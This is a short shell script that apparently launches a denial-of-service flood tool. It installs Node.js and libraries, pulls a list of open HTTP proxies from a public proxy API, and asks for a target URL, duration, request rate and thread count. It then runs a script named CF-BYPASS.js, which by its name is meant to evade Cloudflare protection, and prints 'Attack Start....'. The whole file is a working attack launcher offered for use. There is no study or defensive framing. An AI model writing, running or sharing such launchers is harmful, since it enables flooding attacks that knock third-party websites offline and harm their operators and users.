
echo -e "This tool can crash your device. Be careful."
clear
echo -e "Installation..."
apt update && apt upgrade -y
apt install yarn nodejs -y
yarn add axios user-agents
echo -e "Installation Complete."
echo -e "Adding fresh proxies..."

curl "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" > fresh.txt
clear
echo -e "ALL SET"
echo "Enter target url:"
read tgt
echo "Enter time in seconds e.g 240:"
read tim
echo "Enter Rate(No of request per second):"
read rate
echo "Enter threads e.g 1000000000:"
read thrd

echo "Attack Start...."
node CF-BYPASS.js $tgt $tim $rate $thrd fresh.txt


